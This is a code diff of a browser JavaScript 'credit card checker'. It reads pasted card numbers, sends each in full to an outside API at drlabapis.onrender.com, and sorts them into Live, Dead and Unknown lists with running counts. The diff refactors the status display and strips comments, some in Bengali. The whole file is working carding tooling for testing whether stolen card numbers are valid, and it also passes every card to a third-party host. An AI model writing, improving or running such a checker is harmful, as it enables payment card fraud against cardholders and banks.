@@ -1,18 +1,16 @@
 let stopChecking = false;
-let currentCheckingIndex = 0; // To keep track of which card is being checked
+let currentCheckingIndex = 0;
 
 document.addEventListener('DOMContentLoaded', () => {
     const checkBtn = document.getElementById("check-btn");
     const stopCheckBtn = document.getElementById("stop-check-btn");
     const numbersTextarea = document.getElementById("numbers");
-    const resultOutputTextarea = document.getElementById("result-output"); // This will show general checking status
+    const resultOutputTextarea = document.getElementById("result-output");
 
-    // Get references to the specific result textareas
     const liveNumbersTextarea = document.getElementById("ali-numbers");
     const deadNumbersTextarea = document.getElementById("muhammad-numbers");
     const unknownNumbersTextarea = document.getElementById("murad-numbers");
 
-    // Get references to the count display elements
     const liveCountSpan = document.getElementById("ali-count");
     const deadCountSpan = document.getElementById("muhammad-count");
     const unknownCountSpan = document.getElementById("murad-count");
@@ -35,24 +33,22 @@ document.addEventListener('DOMContentLoaded', () => {
 
     async function startChecking() {
         stopChecking = false;
-        currentCheckingIndex = 0; // Reset index for a new check
+        currentCheckingIndex = 0;
+
         const input = numbersTextarea.value.trim();
         const cards = input.split("\n").filter(line => line.trim() !== "");
 
-        // Clear previous results from all areas
-        resultOutputTextarea.value = "Starting check..."; // Initial message
+        resultOutputTextarea.value = "";
         liveNumbersTextarea.value = "";
         deadNumbersTextarea.value = "";
         unknownNumbersTextarea.value = "";
 
-        // Reset counts
         updateSummaryCounts(0, 0, 0);
 
         if (cards.length === 0) {
             Swal.fire("No Cards", "Please enter credit card numbers to check.", "info");
             checkBtn.disabled = false;
             stopCheckBtn.disabled = true;
-            resultOutputTextarea.value = "No cards to check.";
             return;
         }
 
@@ -63,93 +59,78 @@ document.addEventListener('DOMContentLoaded', () => {
 
         for (let i = 0; i < totalCards; i++) {
             if (stopChecking) {
-                updateStatusText(`Checking stopped at ${i}/${totalCards} cards.`);
+                appendToStatusOutput(`🛑 Checking stopped at ${i}/${totalCards} cards.`);
                 break;
             }
 
             const card = cards[i].trim();
             if (!card) continue;
 
-            // Update general status area with current progress
-            updateStatusText(`Checking card ${i + 1} of ${totalCards}...`);
-
+            appendToStatusOutput(`➡️ Checking card ${i + 1} of ${totalCards}...`);
             try {
                 const apiUrl = `https://drlabapis.onrender.com/api/chk?cc=${encodeURIComponent(card)}`;
-
                 const response = await fetch(apiUrl);
-                if (!response.ok) {
-                    throw new Error(`HTTP error! status: ${response.status}`);
-                }
+
+                if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
                 const data = await response.json();
 
-                let resultLine = card; // শুধুমাত্র কার্ড নম্বর দেখানোর জন্য 'No message' সরানো হয়েছে
-                
+                let resultLine = `${card}`;
+                let displayResult = "";
+
                 if (data.response === "Live") {
                     liveCount++;
                     appendResultToSpecificOutput(liveNumbersTextarea, resultLine);
+                    displayResult = `🟢 Live`;
                 } else if (data.response === "Dead") {
                     deadCount++;
                     appendResultToSpecificOutput(deadNumbersTextarea, resultLine);
+                    displayResult = `🔴 Dead`;
                 } else {
                     unknownCount++;
                     appendResultToSpecificOutput(unknownNumbersTextarea, resultLine);
+                    displayResult = `🟡 Unknown`;
                 }
 
-            } catch (err) {
-                console.error("Error checking card:", card, err);
-                unknownCount++;
-                // Append error to unknown section if API call failed, but keep status brief
-                appendResultToSpecificOutput(unknownNumbersTextarea, `${card} - Error: ${err.message || 'Network error / API issue'}`);
-            }
-            
-            // Update counts on the UI
-            updateSummaryCounts(liveCount, deadCount, unknownCount);
-            
-            // Short delay to avoid hammering the API and allow UI to update
-            await new Promise(resolve => setTimeout(resolve, 500)); // 500ms delay
+                appendToStatusOutput(`${resultLine} ${displayResult}`);
 
-            currentCheckingIndex++; // Increment for next card
+            } catch (err) {
+                unknownCount++;
+                appendResultToSpecificOutput(unknownNumbersTextarea, `${card} - Error: ${err.message}`);
+                appendToStatusOutput(`${card} ⚠️ Error: ${err.message}`);
+            }
+
+            updateSummaryCounts(liveCount, deadCount, unknownCount);
+            await new Promise(resolve => setTimeout(resolve, 500));
+            currentCheckingIndex++;
         }
 
-        // Final summary message in the main status area
-        updateStatusText(`Checking Finished! Total: ${totalCards}, Live: ${liveCount}, Dead: ${deadCount}, Unknown: ${unknownCount}`);
+        appendToStatusOutput(
+            `\n✅ Checking Finished!\n` +
+            `Total: ${totalCards}\n🟢 Live: ${liveCount}\n🔴 Dead: ${deadCount}\n🟡 Unknown: ${unknownCount}`
+        );
 
         checkBtn.disabled = false;
         stopCheckBtn.disabled = true;
-        Swal.fire("Checking Complete", "All credit cards have been processed and sorted.", "success");
+        Swal.fire("Checking Complete", "All credit cards have been processed.", "success");
     }
 
-    // Helper function to update the main status output by overwriting
-    function updateStatusText(text) {
-        // এখানে পরিবর্তন করা হয়েছে
-        if (text.startsWith("Checking Finished!")) {
-            const parts = text.split(", ");
-            const total = parts[0].split(": ")[1];
-            const live = parts[1].split(": ")[1];
-            const dead = parts[2].split(": ")[1];
-            const unknown = parts[3].split(": ")[1];
-            resultOutputTextarea.value = `Checking Finished!\nTotal: ${total}\nLive: ${live}\nDead: ${dead}\nUnknown: ${unknown}`;
-        } else {
-            resultOutputTextarea.value = text;
-        }
+    function appendToStatusOutput(text) {
+        resultOutputTextarea.value += `${text}\n`;
         resultOutputTextarea.scrollTop = resultOutputTextarea.scrollHeight;
     }
 
-    // Helper function to append text to a specific result textarea and scroll it
     function appendResultToSpecificOutput(textareaElement, text) {
         textareaElement.value += text + '\n';
         textareaElement.scrollTop = textareaElement.scrollHeight;
     }
 
-    // Helper function to update the summary counts (Live, Dead, Unknown spans)
     function updateSummaryCounts(live, dead, unknown) {
         liveCountSpan.textContent = live;
         deadCountSpan.textContent = dead;
         unknownCountSpan.textContent = unknown;
     }
 
-    // Function to handle copy to clipboard for textareas
-    window.copyToClipboard = function(elementId) {
+    window.copyToClipboard = function (elementId) {
         const textareaElement = document.getElementById(elementId);
         if (textareaElement && textareaElement.value) {
             navigator.clipboard.writeText(textareaElement.value).then(() => {
